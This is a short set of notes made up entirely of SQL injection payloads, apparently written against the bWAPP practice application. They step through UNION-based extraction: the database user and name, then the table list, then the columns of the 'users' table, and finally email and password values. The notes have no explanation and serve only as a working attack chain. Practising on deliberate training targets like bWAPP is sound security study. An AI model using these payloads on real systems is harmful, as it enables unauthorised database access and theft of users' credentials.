' union select 1,user(),database(),4,5,6,7# -> bwapp

hello' union select 1,user(),group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema='bwapp'#

hello' union select 1,user(),group_concat(column_name),4,5,6,7 from information_schema.columns where table_schema='bwapp' and table_name='users'##

hello' and 1=0 union select 1,email,password,4,5,6,7 from users#
